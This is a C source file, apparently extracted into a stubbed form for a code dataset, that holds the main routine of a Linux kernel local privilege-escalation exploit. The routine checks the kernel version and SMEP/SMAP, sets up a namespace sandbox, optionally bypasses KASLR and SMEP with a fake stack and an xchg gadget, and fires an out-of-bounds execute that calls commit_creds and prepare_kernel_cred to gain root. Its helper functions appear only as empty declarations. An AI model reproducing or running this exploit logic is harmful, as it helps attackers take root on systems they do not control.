#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  COMMIT_CREDS ; 
 int /*<<< orphan*/  KERNEL_BASE ; 
 int /*<<< orphan*/  PREPARE_KERNEL_CRED ; 
 char* SHELL ; 
 unsigned long XCHG_EAX_ESP_RET ; 
 int /*<<< orphan*/  check_root () ; 
 int /*<<< orphan*/  check_smep_smap () ; 
 int /*<<< orphan*/  detect_kernel () ; 
 int /*<<< orphan*/  dprintf (char*,...) ; 
 int /*<<< orphan*/  get_kernel_addr () ; 
 int /*<<< orphan*/  get_root ; 
 int /*<<< orphan*/  mmap_stack () ; 
 int /*<<< orphan*/  oob_execute (unsigned long) ; 
 int /*<<< orphan*/  setup_sandbox () ; 

int main(int argc, char** argv) {
	if (argc > 1) SHELL = argv[1];

	dprintf("[.] starting\n");

	dprintf("[.] checking kernel version\n");
	detect_kernel();
	dprintf("[~] done, version looks good\n");

	dprintf("[.] checking SMEP and SMAP\n");
	check_smep_smap();
	dprintf("[~] done, looks good\n");

	dprintf("[.] setting up namespace sandbox\n");
	setup_sandbox();
	dprintf("[~] done, namespace sandbox set up\n");

#if ENABLE_KASLR_BYPASS
	dprintf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr();
	dprintf("[~] done, kernel addr:   %lx\n", KERNEL_BASE);
#endif

	dprintf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	dprintf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	dprintf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	dprintf("[~] done, fake stack mmapped\n");
#endif

	dprintf("[.] executing payload %lx\n", payload);
	oob_execute(payload);
	dprintf("[~] done, should be root now\n");

	check_root();

	return 0;
}